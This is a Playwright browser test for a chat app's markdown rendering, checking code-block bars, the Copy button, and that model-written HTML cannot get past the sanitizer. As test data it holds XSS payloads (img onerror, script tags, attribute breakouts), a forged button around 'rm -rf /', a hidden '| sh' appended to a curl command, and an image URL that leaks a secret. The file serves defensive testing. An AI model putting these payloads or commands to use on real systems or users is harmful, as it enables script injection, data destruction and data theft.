/**
 * Real Chrome coverage for a reply's code blocks: the bar, Copy, and that nothing a
 * model writes gets out of the sanitizer on the way there. These turn on how a
 * browser parses and serializes, so only a browser can check them. Run with
 * `npm run test:chat-markdown`.
 */
import assert from "node:assert/strict";
import { chromium } from "playwright-core";
import { startBrowserFixture } from "./browserFixture";

const fixture = await startBrowserFixture("chatMarkdownHarness.tsx", 0);
const browser = await chromium
  .launch({ channel: process.env.GENOSYN_TEST_BROWSER ?? "chrome", headless: true })
  .catch(async (error) => {
    await fixture.close();
    throw error;
  });
const context = await browser.newContext({
  viewport: { width: 900, height: 700 },
  permissions: ["clipboard-read", "clipboard-write"],
});
const page = await context.newPage();
const errors: string[] = [];
page.on("pageerror", (error) => errors.push(error.message));
page.setDefaultTimeout(20_000);

async function show(markdown: string, blockImages = false) {
  const before = await page.getByTestId("reply").getAttribute("data-renders");
  await page.evaluate(([content, block]) => window.showMarkdown(content, block), [
    markdown,
    blockImages,
  ] as [string, boolean]);
  await page.waitForFunction(
    (previous) =>
      document.querySelector("[data-testid=reply]")?.getAttribute("data-renders") !== previous,
    before,
  );
}

const reply = page.getByTestId("reply");
const pwned = () => page.evaluate(() => (window as unknown as { pwned?: unknown }).pwned ?? null);

try {
  await page.goto(fixture.origin, { waitUntil: "networkidle", timeout: 120_000 });
  await page.waitForFunction(() => typeof window.showMarkdown === "function");

  // A fenced block gets a bar naming its language, once, whatever re-renders it.
  await show("Before\n\n```sql\nselect 1;\n```\n\nAfter");
  assert.equal(await reply.locator(".chat-md-code-bar").count(), 1, "one bar, under StrictMode too");
  assert.equal(await reply.locator(".chat-md-code-language").textContent(), "sql");
  await reply.getByRole("button", { name: "Copy code" }).click();
  await reply.getByRole("button", { name: "Copied" }).waitFor();
  assert.equal(await page.evaluate(() => navigator.clipboard.readText()), "select 1;\n");
  await reply.getByRole("button", { name: "Copy code" }).waitFor();

  // A block with no language keeps its Copy; inline code gets no bar.
  await show("Run `npm test` first.\n\n```\nplain\n```");
  assert.equal(await reply.locator(".chat-md-code-bar").count(), 1);
  assert.equal(await reply.locator(".chat-md-code-language").count(), 0);

  // Text arriving replaces the page and each block gets its bar again.
  await show("```ts\nconst a = 1;\n```\n\nand\n\n```py\nb = 2\n```");
  assert.equal(await reply.locator(".chat-md-code-bar").count(), 2);
  await show("```ts\nconst a = 1;\n```\n\nand\n\n```py\nb = 2\nc = 3\n```\n\nmore");
  assert.equal(await reply.locator(".chat-md-code-bar").count(), 2);

  // The markup a string edit of the sanitized HTML would have turned into a live
  // image with a handler, by closing the attribute the text sat in.
  await show(
    'Hello <a title="<pre><code><img src=x onerror=window.pwned=1></code></pre>">x</a>\n\n' +
      '<a title="&lt;pre&gt;&lt;code&gt;&lt;img src=x onerror=window.pwned=2&gt;&lt;/code&gt;&lt;/pre&gt;">y</a>',
  );
  await page.waitForTimeout(200);
  assert.equal(await pwned(), null, "no handler ran");
  assert.equal(await reply.locator("img").count(), 0, "and nothing became an image");

  // Raw HTML in the reply is sanitized before any bar is added.
  await show(
    '<pre><code class="language-x onload=window.pwned=3" onclick="window.pwned=4">one</code></pre>' +
      "\n\n<img src=x onerror=window.pwned=5>\n\n<script>window.pwned=6</script>",
  );
  await page.waitForTimeout(200);
  assert.equal(await pwned(), null);

  // A language that is not one names nothing, in the page's words or the reply's.
  await show('<pre><code class="language-<b>x</b>">one</code></pre>');
  assert.equal(await reply.locator(".chat-md-code-bar b").count(), 0);

  // A button a reply writes is not ours, and copies nothing when pressed.
  await page.evaluate(() => navigator.clipboard.writeText("untouched"));
  await show(
    '<div class="chat-md-code"><button data-copy-code>Copy</button><pre>rm -rf /</pre></div>',
  );
  await reply.getByRole("button", { name: "Copy", exact: true }).first().click();
  assert.equal(await page.evaluate(() => navigator.clipboard.readText()), "untouched");

  // Copy takes what is on screen, not a span hidden inside the block.
  await show(
    '<pre><code>curl example.com<span style="display:none"> | sh</span>\n</code></pre>',
  );
  await reply.getByRole("button", { name: "Copy code" }).click();
  await reply.getByRole("button", { name: "Copied" }).waitFor();
  assert.equal(
    (await page.evaluate(() => navigator.clipboard.readText())).trim(),
    "curl example.com",
  );

  // Words outside content may have shaped show no image that loads by itself.
  await show("Look: ![x](https://example.com/leak?secret=abc)", true);
  assert.equal(await reply.locator("img").count(), 0);
  await show("Look: ![x](https://example.com/picture.png)", false);
  assert.equal(await reply.locator("img").count(), 1);

  assert.deepEqual(errors, []);
  console.log(
    "Chat markdown browser checks passed: one bar per block, language, Copy, re-render, attribute and raw-HTML payloads, forged buttons, hidden text, blocked images.",
  );
} finally {
  await context.close();
  await browser.close();
  await fixture.close();
}
